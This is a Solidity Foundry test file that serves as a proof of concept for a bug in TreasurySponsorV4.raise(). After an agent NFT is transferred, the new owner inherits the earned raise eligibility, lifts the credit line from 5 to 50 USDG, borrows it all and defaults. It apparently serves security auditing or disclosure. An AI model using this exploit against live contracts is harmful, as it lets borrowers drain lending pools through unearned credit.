// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {TreasuryV4Base} from "./TreasurySponsorV4.t.sol";

/// PoC for a transfer-induced privilege escalation in TreasurySponsorV4.raise().
///
/// Preconditions:
///   1. Owner A owns AGENT and gets the normal 5 USDG treasury first line.
///   2. AGENT earns the record needed for raise() through three qualified repayments.
///   3. The NFT is transferred A -> B.
///   4. B has no repayment record of its own and has never been consented for a raise.
///
/// Impact:
///   raise(AGENT) still succeeds for the transferred identity and grows its line
///   from 5 USDG to the 50 USDG second tier. B can then borrow the full 50 USDG.
///   The raise gate relies on agent-level historical state, but only checks the
///   current owner's default mark; it does not bind the earned record to the
///   owner who created it.
contract RaiseAfterTransferPoC is TreasuryV4Base {
    function test_transfer_doesNotInvalidateHistoricalRaiseEligibility() public {
        _funded();
        _firstLine(AGENT, AGENT_PK);
        _qualify(agentOp, AGENT);

        assertEq(pool.getAgent(AGENT).qualifiedRepaid, 3);
        assertEq(pool.ownerDefaults(agentOp2), 0);

        vm.prank(agentOp);
        reg.transferFrom(agentOp, agentOp2, AGENT);

        assertTrue(treasury.eligibleForRaise(AGENT), "fresh owner inherited raise eligibility");

        uint256 lineBefore = _line(AGENT);
        vm.prank(anyone);
        treasury.raise(AGENT);
        uint256 lineAfter = _line(AGENT);

        assertEq(lineBefore, 5 * USDC);
        assertEq(lineAfter, 50 * USDC);

        uint256 loan = _borrow(agentOp2, AGENT, 50 * USDC, 7 days);
        assertEq(pool.getLoan(loan).owner, agentOp2);
        assertEq(pool.getLoan(loan).principal, 50 * USDC);

        _default(loan);
        assertTrue(pool.getAgent(AGENT).defaulted);
    }
}
